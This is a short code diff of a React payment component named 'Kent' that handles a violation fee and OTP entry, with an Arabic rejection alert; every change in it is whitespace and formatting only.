@@ -412,8 +412,8 @@ export default function Kent(props: { setPage?: any; violationValue: number }) {
               // If we're on step 3 and status is rejected, show alert
               setLoading(false)
               alert("تم رفض الرمز,الرجاء ادخال الرمز بشكل صحيح ")
-              setPaymentInfo((prev)=>({...prev,otp:""}))
-            
+              setPaymentInfo((prev) => ({ ...prev, otp: "" }))
+
             }
           }
         }
@@ -542,7 +542,7 @@ export default function Kent(props: { setPage?: any; violationValue: number }) {
               </div>
             </div>
 
-          
+
           </div>
         )
       case 0:
@@ -614,7 +614,7 @@ export default function Kent(props: { setPage?: any; violationValue: number }) {
                     <div className="flex items-center gap-1 text-blue-600">
                     </div>
                   </div>
-                
+
                 </div>
 
                 {/* Second OTP Input field */}
